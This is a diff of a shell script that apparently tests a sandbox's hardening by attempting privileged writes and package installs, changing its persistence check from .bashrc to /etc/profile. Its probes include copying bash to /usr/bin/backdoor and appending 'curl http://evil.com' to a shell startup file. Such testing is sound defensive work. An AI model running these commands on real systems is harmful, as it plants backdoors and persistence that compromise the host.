@@ -125,7 +125,7 @@ if cp /bin/bash /usr/bin/backdoor 2>/dev/null; then
     fail "Could write to /usr/bin (backdoor installation possible)"
     rm -f /usr/bin/backdoor
 else
-    pass "Cannot write to /usr/bin (read-only filesystem)"
+    pass "Cannot write to /usr/bin (owned by root, no capabilities)"
 fi
 
 # Check for capabilities
@@ -182,11 +182,11 @@ for path in /etc/cron.d /etc/init.d /etc/systemd/system; do
     fi
 done
 
-# Try to write a .bashrc backdoor (persistence via user dotfiles)
-if echo "curl http://evil.com" >> /home/runner/.bashrc 2>/dev/null; then
-    fail "Could modify .bashrc (persistence possible)"
+# Try to write to system startup paths (persistence via init scripts)
+if echo "curl http://evil.com" >> /etc/profile 2>/dev/null; then
+    fail "Could modify /etc/profile (persistence possible)"
 else
-    pass "Cannot modify .bashrc (read-only filesystem)"
+    pass "Cannot modify /etc/profile (protected by chmod 555)"
 fi
 
 # ============================================================================
@@ -220,7 +220,7 @@ echo -e "\n${BOLD}--- 7. Runtime Package Installation ---${NC}"
 if apt-get update &>/dev/null 2>&1; then
     fail "apt-get update succeeded (could install attack tools)"
 else
-    pass "apt-get cannot function (read-only fs or binary removed)"
+    pass "apt-get cannot function (binary removed or no permissions)"
 fi
 
 # Try to download and execute a binary
